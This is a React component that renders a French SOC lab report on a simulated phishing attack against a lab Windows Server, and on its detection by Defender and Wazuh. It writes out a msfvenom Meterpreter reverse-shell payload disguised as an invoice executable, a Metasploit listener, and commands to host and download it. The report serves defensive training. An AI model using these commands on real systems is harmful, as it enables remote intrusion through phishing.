import { ReportHeader, H2, H3, Cmd, Table } from './ReportUI'

export default function RapportPhishing() {
  return (
    <article className="text-zinc-300 leading-relaxed">
      <ReportHeader
        title="Phishing msfvenom — Chaîne complète"
        subtitle="Méthode 1 · MITRE T1566 (Phishing) · Détection Defender + Wazuh"
        meta="28 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
      />

      <H2>1. Objectif</H2>
      <p>
        Simuler un phishing par exécutable malveillant : créer un payload avec msfvenom, le livrer à la
        cible via HTTP, et observer la chaîne de détection SOC (Defender → agent Wazuh → dashboard).
        L'objectif n'est pas d'obtenir un shell, mais de <b>prouver que la détection fonctionne de bout en
        bout</b>. Contraintes réelles : Defender actif, aucune exclusion, aucun contournement.
      </p>

      <H2>2. Déroulement de l'attaque</H2>
      <H3>Étape 1 — Création du payload</H3>
      <Cmd term="Kali — Terminal 1">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI] LPORT=4444 \\
  -f exe -o /home/kali/facture_2026.exe`}</Cmd>
      <p>Le nom « facture_2026.exe » simule une pièce jointe de phishing crédible.</p>
      <H3>Étape 2 — Listener Metasploit en attente</H3>
      <Cmd term="Kali — Terminal 2">{`msfconsole -q -x "use exploit/multi/handler;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST [KALI]; set LPORT 4444; run"`}</Cmd>
      <H3>Étape 3 — Serveur HTTP de livraison</H3>
      <Cmd term="Kali — Terminal 3">cd /home/kali && python3 -m http.server 9999</Cmd>
      <H3>Étape 4 — Téléchargement sur la cible (simule le clic victime)</H3>
      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://[KALI]:9999/facture_2026.exe \`
  -OutFile C:\\Windows\\Temp\\facture_2026.exe`}</Cmd>
      <p>
        <b>Résultat immédiat :</b> Defender intercepte l'écriture sur disque et bloque le fichier avant même
        qu'il soit entièrement écrit.
      </p>

      <H2>3. Détection Defender</H2>
      <Table
        head={['Élément', 'Valeur']}
        rows={[
          ['Menace identifiée', 'Trojan:Win32/Zusy.NCD!MTB'],
          ['Mécanisme', 'Machine Learning (AMSI / signatures)'],
          ['Moment', "À l'écriture sur disque (avant exécution)"],
          ['Action', 'Quarantaine immédiate'],
          ['Session Meterpreter', 'NON — payload neutralisé avant exécution'],
        ]}
      />

      <H2>4. Détection Wazuh</H2>
      <Table
        head={['Rule ID', 'Niveau', 'Description', 'Source']}
        rows={[
          ['62123', '12 (CRITIQUE)', 'Windows Defender — menace détectée', 'Event ID 1116'],
          ['62124', '3 (INFO)', 'Windows Defender — quarantaine effectuée', 'Event ID 1117'],
        ]}
      />
      <p className="mt-2">
        Vérification côté serveur avec{' '}
        <span className="font-mono text-xs">Get-MpThreatDetection</span> et le journal{' '}
        <span className="font-mono text-xs">Microsoft-Windows-Windows Defender/Operational</span>
        (Event 1116 = détection, 1117 = action) — exactement les évènements collectés par l'agent 002.
      </p>

      <H2>5. Analyse SOC — Valeur de l'exercice</H2>
      <Table
        head={['Compétence prouvée', 'Détail']}
        rows={[
          ['Chaîne de livraison phishing', 'Payload créé → hébergé → téléchargé = simulation réaliste'],
          ['Détection Defender ML', 'Un payload msfvenom brut détecté sans aucune exécution'],
          ['Remontée SIEM', 'Agent Wazuh collecte les Event ID Defender → rule 62123'],
          ['Réponse SOC attendue', 'Isoler la machine, analyser le hash, escalader si level ≥ 12'],
        ]}
      />

      <H2>6. Conclusion</H2>
      <p>
        La chaîne complète d'un scénario phishing côté SOC est démontrée : création du vecteur, livraison,
        détection automatique par l'EDR (Defender) et remontée d'alerte critique dans le SIEM (rule 62123
        niveau 12). Un analyste Junior doit savoir lire cette alerte, identifier la menace, et connaître
        les actions de réponse. Un attaquant réel utiliserait un framework d'évasion (Cobalt Strike,
        Sliver) — hors périmètre SOC Junior.
      </p>
    </article>
  )
}
